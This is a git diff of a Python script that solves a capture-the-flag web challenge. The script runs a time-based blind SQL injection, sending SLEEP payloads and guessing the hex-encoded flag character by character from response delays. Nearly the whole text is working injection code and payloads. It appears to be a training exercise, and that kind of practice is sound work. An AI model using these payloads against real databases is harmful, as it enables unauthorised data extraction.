@@ -1,4 +1,5 @@
 import requests
+import binascii
 from time import time
 
 
@@ -47,24 +48,26 @@ inj = Inj('http://web-17.challs.olicyber.it')
 
 dictionary = '0123456789abcdef'
 result = ''
-
-previous_payload = "1' AND (SELECT 1 WHERE HEX('SECRET') LIKE '0%')='1"
-current_payload = "1' AND (SELECT SLEEP(1) FROM flags WHERE HEX(flag) LIKE 'guess%')='1"
-
-# registering time to start
-start = time()
+position = 0
 
 while True:
+    position += 1 
+    
     for c in dictionary:
-        question = f"1' and (select sleep(1) from flags where HEX(flag) LIKE '{result+c}%')='1"
+        # registering time to start
+        start = time() 
+        question = f"1' and (select sleep('1') from flags where HEX(flag) LIKE '{result+c}%')='1"
         #launching query...
-        response, error = inj.blind(question)
+        response, error = inj.time(question)
         #compare time final time with the starting time
         elapsed = time() - start
         if elapsed > 1: # We have a match!
             result += c
+            print(f"Founded the character {c} belonging to flag in position {position}")
             break
     else:
         break
     
-print(bytes.fromhex(result).decode('utf-8'))
+print(f"Flag found ---> {result}")
+print(f"Starting decoding flag from hex to str...")
+print(binascii.unhexlify(result))
